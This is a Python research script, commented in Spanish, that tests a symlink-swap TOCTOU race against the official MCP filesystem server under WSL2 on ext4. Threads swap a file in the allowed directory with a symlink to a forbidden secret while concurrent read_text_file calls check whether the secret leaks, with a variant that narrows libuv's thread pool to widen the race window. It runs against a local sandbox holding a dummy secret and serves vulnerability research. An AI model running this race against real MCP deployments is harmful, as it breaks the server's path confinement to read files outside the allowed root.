"""Puerto a Linux/WSL2 (ext4 nativo) del experimento TOCTOU de Windows.

Reproduce la Fase B ("carrera real por la superficie MCP") y la Fase B2
(ventana ensanchada con UV_THREADPOOL_SIZE=1) contra el servidor oficial
@modelcontextprotocol/server-filesystem, ejecutandose DENTRO de WSL sobre
un filesystem ext4 nativo bajo $HOME (NO /mnt/d, para tener unlink POSIX puro).

Hipotesis: en POSIX, unlink sobre fichero abierto SIEMPRE funciona, asi que
la "duty cycle" del atacante (fraccion de tiempo en que race.txt ES el enlace
malicioso) deberia subir del ~21% de Windows hacia ~100%, y la carrera podria
ganarse (n_fugas > 0).

Uso: python toctou_probe_linux.py <salida.json> <B|B2> <rondas> <concurrentes>
"""
import asyncio
import json
import os
import sys
import threading
import time

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

HOME = os.path.expanduser("~")
BASE = os.path.join(HOME, "toctou_sandbox")
PERM = os.path.join(BASE, "permitido")
PROH = os.path.join(BASE, "prohibido")
SECRETO = os.path.join(PROH, "secreto.txt")
RUTA = os.path.join(PERM, "race.txt")
MARCA = "SECRETO_PROHIBIDO_ABCDEF"
LOGDIR = "/mnt/d/Work/research/FileX/bench/salidas-confinamiento-mm/toctou-linux/logs"


def borrar(p):
    try:
        if os.path.islink(p) or os.path.isfile(p):
            os.remove(p)
            return
    except OSError:
        pass
    try:
        os.rmdir(p)
    except OSError:
        pass


def texto(res):
    out = []
    for c in getattr(res, "content", []) or []:
        t = getattr(c, "text", None)
        if t:
            out.append(t)
    return "\n".join(out)


async def llamar(session, tool, args):
    t0 = time.perf_counter()
    try:
        r = await session.call_tool(tool, args)
        return {"ok": True, "isError": bool(getattr(r, "isError", False)),
                "texto": texto(r), "ms": round((time.perf_counter() - t0) * 1000, 2)}
    except Exception as e:
        return {"ok": False, "isError": None,
                "texto": "%s: %s" % (type(e).__name__, e),
                "ms": round((time.perf_counter() - t0) * 1000, 2)}


def params_servidor(extra_env=None):
    env = os.environ.copy()
    if extra_env:
        env.update(extra_env)
    return StdioServerParameters(
        command="npx",
        args=["-y", "@modelcontextprotocol/server-filesystem", PERM],
        cwd=BASE, env=env)


async def carrera(reg, clave, extra_env, rondas, concurrentes, nota):
    borrar(RUTA)
    with open(RUTA, "w") as f:
        f.write("FICHERO REGULAR BENIGNO\n")

    parar = threading.Event()
    cnt = {"swaps": 0, "err_symlink": 0, "err_write": 0, "err_remove": 0,
           "ultimo": ""}

    def intercambiador():
        while not parar.is_set():
            try:
                os.remove(RUTA)
            except OSError as e:
                cnt["err_remove"] += 1
                cnt["ultimo"] = "remove: %s" % e
            try:
                os.symlink(SECRETO, RUTA)
            except OSError as e:
                cnt["err_symlink"] += 1
                cnt["ultimo"] = "symlink: %s" % e
            try:
                os.remove(RUTA)
            except OSError as e:
                cnt["err_remove"] += 1
                cnt["ultimo"] = "remove2: %s" % e
            try:
                with open(RUTA, "w") as f:
                    f.write("FICHERO REGULAR BENIGNO\n")
            except OSError as e:
                cnt["err_write"] += 1
                cnt["ultimo"] = "write: %s" % e
            cnt["swaps"] += 1

    errlog = open(os.path.join(LOGDIR, "toctou_%s.stderr.log" % clave), "w",
                  encoding="utf-8", errors="replace")
    fugas, deneg, oks, enoent, otros, vacias = [], 0, 0, 0, 0, 0
    muestras = []
    total = 0
    async with stdio_client(params_servidor(extra_env), errlog=errlog) as (r_, w_):
        async with ClientSession(r_, w_) as s:
            await s.initialize()
            hilos = [threading.Thread(target=intercambiador, daemon=True)
                     for _ in range(3)]
            for h in hilos:
                h.start()
            t0 = time.perf_counter()
            for _ in range(rondas):
                res = await asyncio.gather(*[
                    llamar(s, "read_text_file", {"path": RUTA})
                    for _ in range(concurrentes)])
                for x in res:
                    total += 1
                    t = x["texto"]
                    if MARCA in t:
                        fugas.append(t[:250])
                    elif "Access denied" in t or "symlink target" in t:
                        deneg += 1
                    elif "ENOENT" in t or "no such file" in t.lower():
                        enoent += 1
                    elif "BENIGNO" in t:
                        oks += 1
                    elif t.strip() == "":
                        vacias += 1
                    else:
                        otros += 1
                        if len(muestras) < 6:
                            muestras.append(t[:200])
                if fugas:
                    break
            dur = time.perf_counter() - t0
            parar.set()
            for h in hilos:
                h.join(timeout=5)
    errlog.close()
    borrar(RUTA)
    # duty cycle observada POR EL SERVIDOR: fraccion de lecturas que vieron el
    # enlace (fuga) o su denegacion (symlink detectado) frente al total. Es la
    # fraccion de tiempo real en que la ruta ERA el enlace malicioso.
    vio_enlace = len(fugas) + deneg
    duty_cycle_servidor = round(vio_enlace / total, 4) if total else None
    reg["fases"][clave] = {
        "descripcion": nota,
        "env_extra": extra_env or {},
        "n_llamadas": total, "concurrentes_por_ronda": concurrentes,
        "segundos": round(dur, 2), "swaps": cnt["swaps"],
        "err_symlink": cnt["err_symlink"], "err_write": cnt["err_write"],
        "err_remove": cnt["err_remove"],
        "ultimo_error_intercambiador": cnt["ultimo"],
        "lecturas_benignas": oks, "denegadas_por_symlink": deneg,
        "enoent": enoent, "respuestas_vacias": vacias, "otros": otros,
        "muestras_otros": muestras,
        "n_fugas": len(fugas), "TOCTOU_REPRODUCIDO": bool(fugas),
        "muestras_de_fuga": fugas[:5],
        "vio_enlace_o_denegado": vio_enlace,
        "duty_cycle_servidor": duty_cycle_servidor,
    }
    print(clave, "->", json.dumps(reg["fases"][clave], ensure_ascii=False)[:1200])


async def main(out_path, fase, rondas, concurrentes):
    reg = {"servidor": "@modelcontextprotocol/server-filesystem (npx, WSL2)",
           "raiz_permitida": PERM, "fase_pedida": fase,
           "rondas": rondas, "concurrentes": concurrentes, "fases": {}}
    if fase == "B":
        await carrera(reg, "B_carrera_normal", None, rondas, concurrentes,
                      "read_text_file en bucle mientras 3 hilos alternan race.txt "
                      "entre fichero regular y enlace al secreto. ext4 nativo, "
                      "config por defecto.")
    elif fase == "B2":
        await carrera(reg, "B2_carrera_ventana_ensanchada",
                      {"UV_THREADPOOL_SIZE": "1"}, rondas, concurrentes,
                      "Misma carrera con UV_THREADPOOL_SIZE=1 y muchas llamadas "
                      "en vuelo: la cola del pool de hilos de libuv separa el "
                      "realpath() de validatePath del readFile() posterior.")
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(reg, f, ensure_ascii=False, indent=2)
    print("escrito", out_path)


if __name__ == "__main__":
    fase = sys.argv[2]
    rondas = int(sys.argv[3])
    concurrentes = int(sys.argv[4])
    asyncio.run(main(sys.argv[1], fase, rondas, concurrentes))
